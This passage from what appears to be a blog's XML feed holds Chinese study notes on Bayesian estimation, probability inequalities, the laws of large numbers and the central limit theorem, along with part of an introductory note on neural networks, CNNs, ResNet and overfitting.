=\dfrac{n!}{x!(n-x)!}\cdot\dfrac{\Gamma(x+1)\Gamma(n-x+1)}{\Gamma(n+2)}=\dfrac{1}{n+1}</script><p>  进而</p><script type="math/tex; mode=display">  f_{\Theta\mid X}(\theta\mid x)=\dfrac{f(x,\theta)}{f_X(x)}=\dfrac{\Gamma(n+2)}{\Gamma(x+1)\Gamma(n-x+1)}\cdot\theta^x(1-\theta)^{n-x}.</script><p>  注意到这恰好为 $\beta(x+1,n-x+1)$ 的 <strong>PDF</strong>.</p><p>  <strong>后验均值</strong>估计值为</p><script type="math/tex; mode=display">  \hat\theta=E(\Theta\mid X)=\int_0^1\theta f_{\Theta\mid X}(\theta\mid x)d\theta=\dfrac{x+1}{n+2}.</script><p>  <strong>后验众数</strong>估计值为 $f_{\Theta\mid X}(\theta\mid x)$ 的最大值点</p><script type="math/tex; mode=display">  \theta^{*}=\dfrac{x}{n}.</script></li><li><p><strong>注</strong>  </p><ul><li>若 $n=20$, $x=13$, 后验分布服从 $\beta(14,8)$.</li><li>此时 $P(\Theta&gt;\dfrac{1}{2})\approx 0.91$, 而 $\Theta&lt;\dfrac{1}{4}$ 基本不可能.</li></ul></li><li><p><strong>注(合理的点估计)</strong></p><ul><li>后验众数;</li><li>后验均值.</li></ul></li><li><p><strong>注(先验分布选取)</strong> </p><ul><li>本问题先验分布服从 $U(0,1)=\beta(1,1)$, 后验分布服从 $\beta(x+1,n-x+1)$;</li><li>一般地, 先验分布服从 $\beta(a,b)$, 后验分布服从 $\beta(a+x,b+n-x)$.</li></ul></li><li><p><strong>定义(Bayes 区间估计)</strong>  得到参数 $\theta$ 的后验分布 $f_{\Theta}(\theta\mid x)$, 给定观测值 $x$ 和实数 $\alpha\in(0,1)$, 若对参数 $\theta$ 的任意可能取值, 都成立</p><script type="math/tex; mode=display">  P(a<\Theta<b\mid x)\ge 1-\alpha.</script><p>  则称 $(a,b)$ 为 $\theta$ 的 $(1−\alpha)$ 置信的 <strong>Bayes</strong> 区间估计.</p></li><li><p><strong>注</strong></p><ul><li>最大后验区间 (一般单峰);</li><li>等尾可信区间.</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, $\sigma^2$ 已知, 给出 $\mu$ 的 $(1-\alpha)$ 置信的 <strong>Bayes</strong> 区间估计.</p></li><li><p><strong>解答</strong>  取 $\mu$ 的先验分布 $f(\mu)\propto 1$, 有后验分布为 $N(\overline{X},\dfrac{\sigma^2}{n})$.</p><p>  进一步可得</p><script type="math/tex; mode=display">  \dfrac{\mu-\overline{X}}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).</script><p>  得到所求 <strong>Bayes</strong> 估计区间为</p><script type="math/tex; mode=display">  (\overline{X}-\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}},\overline{X}+\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}).</script></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h3><ul><li>$X_1,\cdots,X_n$ 为样本, 通常为 <strong>iid</strong>.</li><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 为统计量.</li><li>样本分布: $f(x_1,\cdots,x_n;\theta)$ (<strong>PDF</strong>\*<em>PMF*</em>).</li><li>抽样分布: $\hat\theta$ 的分布.</li><li>标准误差: $se=se(\hat\theta)=\sqrt{Var(\hat\theta)}$.</li></ul><h3 id="经典估计的优良性"><a href="#经典估计的优良性" class="headerlink" title="经典估计的优良性"></a>经典估计的优良性</h3><ul><li>$n$ 固定: 无偏性 &amp; 有效性 (<strong>MSE</strong> 的分解)</li><li>$n\rightarrow\infty$: 渐近无偏 &amp; 相合性 (<strong>WLLN</strong> 一致性) &amp; 渐近正态性 (<strong>CLT</strong>)</li></ul><h3 id="置信区间"><a href="#置信区间" class="headerlink" title="置信区间"></a>置信区间</h3><ul><li>$\hat\theta_i=\hat\theta_i(X_1,\cdots,X_n)\,(i=1,2)$.</li><li>$P(\hat\theta_1&lt;\theta&lt;\hat\theta_2)\ge 1-\alpha$.</li><li>置信 (水平、系数、度) 是针对方法.</li><li>枢轴变量: $H(\hat\theta,\theta)$ 表示分布可用.</li></ul><h3 id="置信区间-v-s-Bayes-区间"><a href="#置信区间-v-s-Bayes-区间" class="headerlink" title="置信区间 v.s. Bayes 区间"></a>置信区间 v.s. Bayes 区间</h3><ul><li><p>(置信区间) 对具体的样本观测值 $(x_1,\cdots,x_n)$, 代入 $\hat\theta_1, \hat\theta_2$ 得到具体区间.</p><script type="math/tex; mode=display">  P(\hat\theta_1<\theta<\hat\theta_2)\ge 1-\alpha.</script></li><li><p>(<strong>Bayes</strong> 区间) 对具体的样本观测值 $(x_1,\cdots,x_n)$, 代入 $a, b$ 得到具体区间.</p><script type="math/tex; mode=display">  P(a<\Theta<b\mid x_1,\cdots,x_n)\ge 1-\alpha.</script></li></ul><h3 id="小样本方法-v-s-大样本方法"><a href="#小样本方法-v-s-大样本方法" class="headerlink" title="小样本方法 v.s. 大样本方法"></a>小样本方法 v.s. 大样本方法</h3><ul><li>精确分布 <strong>v.s.</strong> 近似分布</li></ul><h3 id="Fisher-信息量"><a href="#Fisher-信息量" class="headerlink" title="Fisher 信息量"></a>Fisher 信息量</h3><script type="math/tex; mode=display">\dfrac{\theta^*-\theta}{\sigma_n}\stackrel{近似}{\sim}N(0,1).</script><script type="math/tex; mode=display">\sigma_n=\sqrt{\dfrac{1}{nI(\theta)}}或\sqrt{\dfrac{1}{nI(\theta^*)}}.</script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记5</title>
      <link href="/2023/04/22/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-5/"/>
      <url>/2023/04/22/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-5-不等式与极限定理"><a href="#Chap-5-不等式与极限定理" class="headerlink" title="Chap 5 不等式与极限定理"></a>Chap 5 不等式与极限定理</h1><h2 id="概率不等式"><a href="#概率不等式" class="headerlink" title="概率不等式"></a>概率不等式</h2><ul><li><p><strong>定义(Markov 不等式)</strong>  $Y\ge 0$, $\forall\,a&gt;0$, 有</p><script type="math/tex; mode=display">P(Y\ge a)\le \dfrac{E(Y)}{a}.</script></li><li><p><strong>证明</strong>  令示性变量</p><script type="math/tex; mode=display">I=\begin{cases}1,Y\ge a;\\0,Y<a.\end{cases}</script><p>从而有 $I\le \dfrac{Y}{a}$, 两边取期望, 即得</p><script type="math/tex; mode=display">P(Y\ge a)\le \dfrac{E(Y)}{a}.</script></li><li><p><strong>定义(Chebyshev 不等式)</strong>  $Var(Y)$ 存在, $\forall\,a&gt;0$, 有</p><script type="math/tex; mode=display">P(\vert Y-E(Y)\vert\ge a)\le \dfrac{Var(Y)}{a^2}.</script></li><li><p><strong>证明</strong>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  P(\vert Y-E(Y)\vert\ge a)&=P((Y-E(Y))^2\ge a^2)\\  &\le\dfrac{E[(Y-E(Y))^2]}{a^2}\\  &=\dfrac{Var(Y)}{a^2}.  \end{aligned}</script></li><li><p><strong>注</strong>  若 $Var(Y)=0$, 则 $P(Y=E(Y))=1$. ($Y=E(Y)$ $a.s.$)</p></li><li><p><strong>定义(Chernoff 不等式)</strong>  $\forall\,a&gt;0$, $t&gt;0$, 有</p><script type="math/tex; mode=display">P(Y\ge a)\le \dfrac{E(e^{tY})}{e^{ta}}.</script></li><li><p><strong>证明</strong>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  P(Y\ge a)&=P(e^{tY}\ge e^{ta})\,(保证\,e^{tY}>0)\\  &\le\dfrac{E(e^{tY})}{e^{ta}}.  \end{aligned}</script></li><li><p><strong>例</strong>  $X\sim N(0,1)$, 估计 $P(\vert X\vert\ge 3)$.</p></li><li><p><strong>解答</strong>  我们有</p><script type="math/tex; mode=display">  P(\vert X\vert\ge 3)\le   \begin{cases}  \dfrac{E(\vert X\vert)}{3}=\dfrac{1}{3}\sqrt{\dfrac{2}{\pi}}\approx 0.27;\quad(Markov)\\  \dfrac{Var(X)}{3^2}=\dfrac{1}{9}\approx 0.11;\quad(Chebyshev)\\  \dfrac{2E(e^{tX})}{e^{3t}}=2e^{\tfrac{t^2}{2}-3t}\le 2e^{-\tfrac{9}{2}}\approx 0.02.\quad(Chernoff)  \end{cases}</script></li></ul><h2 id="大数定律-LLN"><a href="#大数定律-LLN" class="headerlink" title="大数定律 (LLN)"></a>大数定律 (LLN)</h2><ul><li><p><strong>定义</strong>  $X_1,X_2,\cdots$ <strong>iid</strong> (独立同分布), $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 定义:</p><script type="math/tex; mode=display">\overline{X}=\dfrac{1}{n}\sum_{i=1}^{n}X_i,\, E(\overline{X})=\mu,\,Var(\overline{X})=\dfrac{\sigma^2}{n}\rightarrow 0.</script></li><li><p><strong>定义(Khinchin 弱大数定律)(WLLN)</strong> </p><p>  若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 则 $\forall\varepsilon&gt;0$, 有</p><script type="math/tex; mode=display">  \lim_{n\rightarrow\infty}P(\vert \overline{X}-\mu\vert\ge \varepsilon)=0.</script></li><li><p><strong>证明</strong>  我们有</p><script type="math/tex; mode=display">  P(\vert \overline{X}-\mu\vert\ge \varepsilon)\le\dfrac{Var(\overline{X})}{\varepsilon^2}=\dfrac{\sigma^2}{n\varepsilon^2}\rightarrow 0, 当\,n\rightarrow 0.</script></li><li><p><strong>注</strong></p><ul><li><p>$\mu\approx\overline{X}$ (在很大概率意义下可以用作样本均值估计);</p></li><li><p>$\forall\,\varepsilon&gt;0$, $\forall\,\alpha&gt;0$, $\exists N&gt;0$ 使得当 $n\ge N$ 时</p><script type="math/tex; mode=display">P(\vert \overline{X}-\mu\vert\ge \varepsilon)\le\alpha.</script><p>其中 $\varepsilon$ 体现了精度，$\alpha$ 体现了置信度.</p></li><li><p><strong>Bernoulli LLN</strong>: $X_i\sim B(p)$, 则特殊地得到 <strong>Bernoulli</strong> 大数定律。</p></li><li><p>方差有限条件可去掉, 结论依然成立;</p></li><li><p>可推广至不同的条件:</p><ul><li>$X_i$ 两两不相关,  $Var(X_i)$ 一致有界 (<strong>Chebyshev</strong>);</li><li>$Var(\overline{X})\rightarrow 0$ (<strong>Markov</strong>).</li></ul></li></ul></li><li><p><strong>定义(依概率收敛)</strong></p><script type="math/tex; mode=display">Y_n\stackrel{P}{\longrightarrow}Y\Longleftrightarrow\forall\varepsilon>0, \lim_{n\rightarrow\infty}P(\vert Y_n-Y\vert\ge\varepsilon)=0.</script></li><li><p><strong>注</strong>  <strong>WLLN</strong> $\Rightarrow\overline{X}\stackrel{P} {\longrightarrow}\mu$ (考虑偏差).</p></li><li><p><strong>定义(Kolmogov 强大数定律)(SLLN)</strong></p><p>  若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$. 则有</p><script type="math/tex; mode=display">  P(\omega\in\Omega\mid \lim_{n\rightarrow\infty}\overline{X_n}(\omega)=\mu)=P(\lim_{n\rightarrow\infty}\overline{X}=\mu)=1.</script></li><li><p><strong>注</strong>  若 $X_i\sim B(p)$ 则 $\overline{X}$ 为频率,从而概率的频率解释是合理的.</p></li><li><p><strong>定义(以概率 1 收敛)</strong></p><script type="math/tex; mode=display">Y_n\stackrel{a.s.}{\longrightarrow}Y\Longleftrightarrow P(\lim_{n\rightarrow\infty}Y_n=Y)=1.</script></li><li><p><strong>注</strong>  <strong>SLLN</strong> $\Rightarrow\overline{X}\stackrel{a.s.} {\longrightarrow}\mu$ (逐点考虑).</p></li><li><p><strong>例</strong>  (<strong>Monte Carlo</strong> 积分)</p></li><li><p><strong>解答</strong>  在 $[a,b]\times [0,c]$ 上取点 $(X_i,Y_i)$ <strong>iid</strong> 在矩形内均匀分布. 定义</p><script type="math/tex; mode=display">  I_i=  \begin{cases}  1,(X_i,Y_i)\in D;\\  0,(X_i,Y_i)\notin D.  \end{cases}</script><p>  则 $I_i\stackrel{iid} {\longrightarrow}B(p)$. 我们有</p><script type="math/tex; mode=display">  P=\dfrac{1}{(b-a)c}\int_a^bg(x)dx\approx\dfrac{1}{n}\sum_{i=1}^{n}I_i.</script></li><li><p><strong>例</strong>  两种收敛有什么差别?</p></li><li><p><strong>解答</strong>  考虑 $\Omega=[0,1]$ 均匀分布 (从而有 ($\Omega,\mathscr{F},P$)). 我们构造</p><script type="math/tex; mode=display">Y_1(\omega)=\omega+I_{[0,1]}(\omega)\\Y_2(\omega)=\omega+I_{[0,\frac{1}{2}]}(\omega)\\Y_3(\omega)=\omega+I_{[\frac{1}{2},1]}(\omega)\\Y_4(\omega)=\omega+I_{[0,\frac{1}{3}]}(\omega)\\Y_5(\omega)=\omega+I_{[\frac{1}{3},\frac{2}{3}]}(\omega)\\Y_6(\omega)=\omega+I_{[\frac{2}{3},1]}(\omega)\\\cdots\\Y(\omega)=\omega.</script><p>因此有 $Y_n\stackrel{P} {\longrightarrow}Y$, 但是 $Y_n\stackrel{a.s.} {\longrightarrow}Y$ 不成立.</p><p>这是因为 $\forall\,\omega_0\in(0,1)$, $Y_n(\omega_0)$ 是振荡的, 它的极限不存在.</p></li></ul><h2 id="中心极限定理-CLT"><a href="#中心极限定理-CLT" class="headerlink" title="中心极限定理 (CLT)"></a>中心极限定理 (CLT)</h2><ul><li><p><strong>定义(中心极限定理)(CLT)</strong></p><p>若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 我们有</p><script type="math/tex; mode=display">\lim_{n\rightarrow\infty}P\left(\dfrac{X_1+\cdots+X_n-n\mu}{\sqrt{n}\sigma}\le x\right)=\Phi(x),\,\forall\,x\in\mathbb{R}.</script><p>其中 $\Phi(x)$ 为 $N(0,1)$ 的 <strong>CDF</strong>. 也即</p><script type="math/tex; mode=display">\lim_{n\rightarrow\infty}P\left(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\le x\right)=\Phi(x),\,\forall\,x\in\mathbb{R}.</script></li><li><p><strong>证明</strong>  只在 $X_i$ 的 <strong>MGF</strong> 存在情形下证明, 记 $M(t)=M_{X_i}(t)$.</p><p>  不失一般性地, 令 $\mu=0$, $\sigma^2=1$. 因此</p><script type="math/tex; mode=display">  M(0)=E(1)=1,\\  M'(0)=E(X_i)=\mu=0,\\  M''(0)=E(X_i^2)=\sigma^2=1.</script><p>  我们得到</p><script type="math/tex; mode=display">  \begin{aligned}  E(e^{t\frac{X_1+\cdots+X_n}{\sqrt{n}}})&=M^n(\tfrac{t}{\sqrt{n}})\\  &=\left(1+\tfrac{t^2}{2n}+o(\tfrac{t^2}{n})\right)^n\\  &\rightarrow e^{\tfrac{t^2}{2}}.  \end{aligned}</script></li></ul><ul><li><p><strong>注</strong></p><ul><li><p>上述 <strong>CLT</strong> 通常称为 <strong>Lindeberg-Levy CLT</strong>;</p></li><li><p><strong>CLT</strong> $\Rightarrow X_1+\cdots+X_n\sim N(n\mu,n\sigma^2)$, $\overline{X}\sim N(\mu,\dfrac{\sigma^2}{n})$;</p></li><li><p><strong>(DeMoivre-Laplace CLT)</strong>  </p><p>  若 $X_i\sim B(p)$, 则 $\sum\limits_{i=1}^{n}X_i\sim B(n,p)\stackrel{CLT} {\longrightarrow}$ 正态分布.</p></li></ul></li><li><p><strong>定义(二项分布下 CLT 的连续性修正)</strong></p><p>我们有 $P(t_1\le\sum\limits_{i=1}^{n}X_i\le t_2)\approx\Phi(y_2)-\Phi(y_1)$. 其中</p><script type="math/tex; mode=display">\begin{cases}y_1=\dfrac{t_1-np-\tfrac{1}{2}}{\sqrt{np(1-p)}},\\y_2=\dfrac{t_2-np+\tfrac{1}{2}}{\sqrt{np(1-p)}}.\end{cases}</script><p>修正形式可计算单点 $P(S_n=k)$ 的概率, 对其他离散变量也同样适用.</p></li><li><p><strong>定义(依分布收敛)</strong></p><script type="math/tex; mode=display">Y_n\stackrel{d}{\longrightarrow}Y\Longleftrightarrow \lim_{n\rightarrow\infty}F_n(x)=F(x).</script></li></ul><ul><li><p><strong>注</strong>  <strong>CLT</strong> $\Rightarrow Z_n=\dfrac{X_1+\cdots+X_n-n\mu}{\sqrt{n}\sigma}=\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}$ (标准化).</p></li><li><p><strong>例(选举问题)</strong>  设 $p$ 为选民支持率(未知), 随机调查 $n$ 个人, 支持比例为 $p_n=\dfrac{1}{n}\sum\limits_{i=1}^{n}X_i$, 其中 $X_i\sim B(p)$. 若 $\varepsilon=0.03$, $1-\alpha=0.95$, 求 $n$ 的取值.</p></li><li><p><strong>解答</strong>  有</p><script type="math/tex; mode=display">  P(\left|p_n-p\right|\ge\varepsilon)\le \alpha.</script><p>  由 <strong>CLT</strong> 可得</p><script type="math/tex; mode=display">  \begin{aligned}  P(\left|p_n-p\right|\ge\varepsilon)&=1-P\Big(-\dfrac{\sqrt{n}\varepsilon}{\sigma}\le\dfrac{p_n-p}{\tfrac{\sigma}{\sqrt{n}}}\le\dfrac{\sqrt{n}\varepsilon}{\sigma}\Big)\\  &=1-\Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)+\Phi\Big(-\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\\  &=2-2\Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\le\alpha.  \end{aligned}</script><p>  即得</p><script type="math/tex; mode=display">  \Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\ge 1-\dfrac{\alpha}{2}.</script><p>  为使得对任意 $p$ 成立, 取 $p=\dfrac{1}{2}$, 即有</p><script type="math/tex; mode=display">  \Phi\Big(2\sqrt{n}\varepsilon\Big)\ge 1-\dfrac{\alpha}{2}.</script><p>  注意到 $\Phi(1.96)\approx 0.975=1-\dfrac{\alpha}{2}$, 因此取 $n\ge 1068$ 即可 (与 $N$ 无关).</p></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="尾部概率控制"><a href="#尾部概率控制" class="headerlink" title="尾部概率控制"></a>尾部概率控制</h3><h3 id="极限定理"><a href="#极限定理" class="headerlink" title="极限定理"></a>极限定理</h3><ul><li><strong>LLN</strong>: 弱 or 强</li><li><strong>CLT</strong></li></ul><h3 id="三种收敛"><a href="#三种收敛" class="headerlink" title="三种收敛"></a>三种收敛</h3><h3 id="CLT-应用"><a href="#CLT-应用" class="headerlink" title="CLT 应用"></a><strong>CLT</strong> 应用</h3><script type="math/tex; mode=display">\begin{cases}X_1+\cdots+X_n\sim N(n\mu,n\sigma^2);\\\overline{X}\sim N(\mu,\dfrac{\sigma^2}{n}).\end{cases}</script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能导论 笔记2</title>
      <link href="/2023/04/17/ren-gong-zhi-neng-dao-lun-bi-ji-2/"/>
      <url>/2023/04/17/ren-gong-zhi-neng-dao-lun-bi-ji-2/</url>
      
        <content type="html"><![CDATA[<h1 id="第二章-神经网络和深度学习"><a href="#第二章-神经网络和深度学习" class="headerlink" title="第二章 神经网络和深度学习"></a>第二章 神经网络和深度学习</h1><h2 id="神经网络-——-从数字识别说起"><a href="#神经网络-——-从数字识别说起" class="headerlink" title="神经网络 —— 从数字识别说起"></a>神经网络 —— 从数字识别说起</h2><ul><li><p>深度学习 $\subseteq$ 机器学习 $\subseteq$ 人工智能.</p>  <div align="center"><img src="/pic/61.png" width="100%" height="100%"></div></li><li><p>$w_i(1\le i\le n)$ 表示<strong>数字模式</strong>, $x_i(1\le i\le n)$ 表示<strong>数字图像</strong>, 大小表示<strong>匹配程度</strong>.</p><script type="math/tex; mode=display">  net=\sum_{i=1}^{n}w_i\cdot x_i.</script></li><li><p><strong>Sigmoid 函数</strong>: 评判<strong>匹配的程度</strong>, 将匹配结果变换到 0~1 之间.</p><script type="math/tex; mode=display">  \sigma(net)=\dfrac{1}{1+e^{-net}}.</script></li><li><p><strong>增加偏置项</strong>: 使 <strong>Sigmoid</strong> 函数平移.</p><script type="math/tex; mode=display">  net=\sum_{i=1}^{n}w_i\cdot x_i+b;\\  y=sigmoid(net).</script>  <div align="center"><img src="/pic/62.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/63.png" width="100%" height="100%"></div></li><li><p><strong>神经元</strong>代表一个<strong>模式</strong>, 其输出为匹配结果.</p></li><li><p><strong>神经网络的扩展</strong>:</p><ul><li><p><strong>横向</strong> —— 增加模式.</p>  <div align="center"><img src="/pic/64.png" width="100%" height="100%"></div></li><li><p><strong>纵向</strong> —— 局部模式.</p>  <div align="center"><img src="/pic/65.png" width="100%" height="100%"></div></li><li><p><strong>网络更深</strong> —— 模式组合.</p>  <div align="center"><img src="/pic/66.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>获得模式</strong>:</p><ul><li>模式通过神经元的<strong>连接权重</strong>表示.</li><li>通过训练样本, <strong>自动学习</strong>权重 (模式), 不是人工设计.</li><li>学习到的模式是一种<strong>隐含表达</strong>.</li></ul></li></ul><h2 id="神经元与神经网络"><a href="#神经元与神经网络" class="headerlink" title="神经元与神经网络"></a>神经元与神经网络</h2><ul><li><p>神经元:</p><script type="math/tex; mode=display">  net=\sum_{i=1}^{n}w_i\cdot x_i+b=\sum_{i=0}^{n}w_i\cdot x_i;\\  o=g(net).</script>  <div align="center"><img src="/pic/67.png" width="100%" height="100%"></div></li><li><p><strong>激活函数</strong>:</p><ul><li><p>符号函数.</p></li><li><p><strong>Sigmoid</strong> 函数.</p></li><li><p>双曲正切函数.</p></li><li><p><strong>ReLU</strong> 函数.</p></li><li><p><strong>Softmax</strong> 函数.</p><script type="math/tex; mode=display">  o_k=\dfrac{e^{net_k}}{\sum\limits_{i=1}^{m}e^{net_i}}.</script>  <div align="center"><img src="/pic/68.png" width="100%" height="100%"></div></li></ul></li></ul><h2 id="如何训练神经网络"><a href="#如何训练神经网络" class="headerlink" title="如何训练神经网络"></a>如何训练神经网络</h2><ul><li><p><strong>建立数据集 (以动物识别为例)</strong>:</p><ul><li>收集各种动物的照片:<ul><li>不同姿势.</li><li>不同角度.</li><li>不同大小.</li></ul></li><li>数据标注:<ul><li>每张照片标注上动物的名称.</li></ul></li><li>训练集与测试集:<ul><li>样本.</li></ul></li></ul></li><li><p><strong>训练网络</strong>: 调整神经元权重.</p></li><li><p><strong>评价效果</strong>: 损失函数.</p></li><li><p><strong>误差平方和损失函数</strong>:</p><ul><li><p>用于<strong>输出是具体数值</strong>的问题.</p></li><li><p>对样本 $d$ 的误差:</p><script type="math/tex; mode=display">  E_d(w)=\dfrac{1}{2}\sum_{k=1}^{m}(t_{kd}-o_{kd})^2.</script></li><li><p>对所有样本的误差:</p><script type="math/tex; mode=display">  E(w)=\sum_{d=1}^{n}E_d(w)=\dfrac{1}{2}\sum_{d=1}^{n}\sum_{k=1}^{m}(t_{kd}-o_{kd})^2.</script>  <div align="center"><img src="/pic/69.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>梯度下降法</strong>:</p><ul><li><p>迭代公式: 对<strong>权重求导</strong>, 作为下降的梯度大小.</p><script type="math/tex; mode=display">  w_i^{new}=w_i^{old}+\Delta w_i,\,\Delta w_i=-\eta\dfrac{\part E(w)}{\part w_i}.\\  \Rightarrow w^{new}=w^{old}+\Delta w,\,\Delta w=-\eta\nabla_wE(w)=-\eta\big[\dfrac{\part E(w)}{\part w_i}\big]_{1\le i\le n}.</script></li><li><p>梯度下降<strong>算法</strong>:</p><ul><li>批量梯度下降算法.</li><li>随机梯度下降算法.</li><li>小批量梯度下降算法.</li></ul><div align="center"><img src="/pic/70.png" width="100%" height="100%"></div></li><li><p><strong>输出层</strong> (只影响<strong>一个输出</strong>):</p>  <div align="center"><img src="/pic/71.png" width="100%" height="100%"></div></li><li><p><strong>隐含层</strong> (影响<strong>多个输出</strong>):</p>  <div align="center"><img src="/pic/72.png" width="100%" height="100%"></div></li><li><p>整体梯度计算:</p>  <div align="center"><img src="/pic/73.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>反向传播算法 (BP算法)</strong>: 随机梯度下降算法的一种实现.</p>  <div align="center"><img src="/pic/75.png" width="100%" height="100%"></div><ul><li>随机梯度下降版: <strong>初始化所有权值为小的随机值</strong>, 如 $[-0.05,0.05]$.</li><li>算法条件:<ul><li><strong>全连接</strong>网络.</li><li>批量、小批量梯度下降算法.</li><li>激活函数: <strong>Sigmoid</strong> 函数.</li><li>损失函数: <strong>误差平方和</strong>.</li></ul></li></ul></li><li><p><strong>交叉熵损失函数</strong>:</p><script type="math/tex; mode=display">  H_d(w)=-\sum_{k=1}^{M}t_{kd}\log o_{kd}.\\  H(w)=\sum_{d=1}^{N}H_d(w)=-\sum_{d=1}^{N}\sum_{k=1}^{M}t_{kd}\log o_{kd}.</script><p>  其中 $t_{kd}$ 为样本的<strong>希望</strong>输出值, $o_{kd}$ 为样本的<strong>实际</strong>输出值, 需要为概率值. 这给出了<strong>两个不同的概率分布间的距离</strong>. 对于<strong>分类问题</strong>, 对于给定输入样本 $d$, 只有 $d$ 对应的希望输出为 1, 其他为 0. 此时</p><script type="math/tex; mode=display">  H_d(w)=-\log o_{kd}.\\</script>  <div align="center"><img src="/pic/75.png" width="100%" height="100%"></div></li></ul><h2 id="卷积神经网络-CNN"><a href="#卷积神经网络-CNN" class="headerlink" title="卷积神经网络 (CNN)"></a>卷积神经网络 (CNN)</h2><ul><li><p><strong>全连接网络</strong>的不足:</p><ul><li>连接<strong>权重过多</strong>.</li><li>影响<strong>训练速度</strong>.</li><li>影响<strong>使用速度</strong>.</li></ul></li><li><p><strong>卷积神经网络</strong>的特点:</p><ul><li><strong>参数少</strong>, 只与卷积核的大小和数量有关.</li><li>具有<strong>特征抽取</strong>能力.</li><li>特征的<strong>平移不变性</strong> (一定程度上).</li></ul></li><li><p>提取局部模式:</p>  <div align="center"><img src="/pic/76.png" width="100%" height="100%"></div><ul><li><p><strong>局部连接</strong>, <strong>权值共享</strong>.</p></li><li><p>卷积核训练通过 <strong>BP</strong> 算法进行.</p></li><li><p><strong>多卷积核</strong>: 一个卷积核产生一个通道, 输出的<strong>通道数</strong>等于<strong>卷积核数</strong>.</p></li><li><p><strong>多输入通道</strong> (例: <strong>RGB</strong> 识别):</p>  <div align="center"><img src="/pic/77.png" width="100%" height="100%"></div><p>  此时视为<strong>多厚度单卷积核</strong>.</p></li><li><p><strong>卷积核大小</strong>: 多层小卷积实现大卷积 (两层 3×3 卷积等效 5×5 卷积).</p></li><li><p><strong>池化</strong>: 一种<strong>降维</strong>的手段 (最大池化/平均池化), 池化<strong>不改变通道数</strong>.</p></li><li><p>卷积核具有<strong>抽取特征</strong>的能力.</p></li></ul></li><li><p><strong>LeNet 神经网络</strong> (数字识别):</p>  <div align="center"><img src="/pic/78.png" width="100%" height="100%"></div></li><li><p><strong>VGG-16 神经网络</strong> (图像识别):</p>  <div align="center"><img src="/pic/79.png" width="100%" height="100%"></div></li></ul><h2 id="梯度消失问题"><a href="#梯度消失问题" class="headerlink" title="梯度消失问题"></a>梯度消失问题</h2><ul><li><p>网络深度过深时:</p>  <div align="center"><img src="/pic/80.png" width="100%" height="100%"></div></li><li><p>使用 <strong>ReLU</strong> 激活函数, 其导数恒为 1:</p>  <div align="center"><img src="/pic/81.png" width="100%" height="100%"></div></li><li><p><strong>GoogLeNet 神经网络</strong> (类比高楼供水系统):</p>  <div align="center"><img src="/pic/82.png" width="100%" height="100%"></div><p>  神经元依靠<strong>就近输出</strong>进行<strong>训练</strong>时的<strong>梯度计算补偿</strong>, 训练结束后只采用最终输出.</p><ul><li><p><strong>Inception 模块</strong>:</p>  <div align="center"><img src="/pic/83.png" width="100%" height="100%"></div><p>  同时使用<strong>不同大小的卷积核.</strong></p></li><li><p><strong>降维 Inception 模块</strong>:</p>  <div align="center"><img src="/pic/84.png" width="100%" height="100%"></div><p>  <strong>使用 1×1 卷积降维</strong>.</p></li><li><p><strong>Inception 模块详析</strong>:</p>  <div align="center"><img src="/pic/85.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>ResNet 残差网络</strong>:</p><ul><li><p>神经网络的<strong>退化</strong>现象 (与<strong>网络结构</strong>有关):</p>  <div align="center"><img src="/pic/86.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/87.png" width="100%" height="100%"></div></li><li><p>残差模块:</p>  <div align="center"><img src="/pic/88.png" width="100%" height="100%"></div><p>  <strong>恒等映射</strong>的存在<strong>解决了梯度消失问题</strong>.</p>  <div align="center"><img src="/pic/89.png" width="100%" height="100%"></div></li></ul></li></ul><h2 id="过拟合问题"><a href="#过拟合问题" class="headerlink" title="过拟合问题"></a>过拟合问题</h2><ul><li><p>神经网络的<strong>过拟合</strong>问题 (<strong>与网络结构无关, 与训练轮次有关</strong>):</p>  <div align="center"><img src="/pic/90.png" width="100%" height="100%"></div></li><li><p><strong>使用验证集</strong>: 用于调整超参数.</p></li><li><p><strong>限制模型的复杂性</strong>:</p><ul><li><p><strong>正则化项法</strong>: 考虑误差平方和损失函数:</p><script type="math/tex; mode=display">  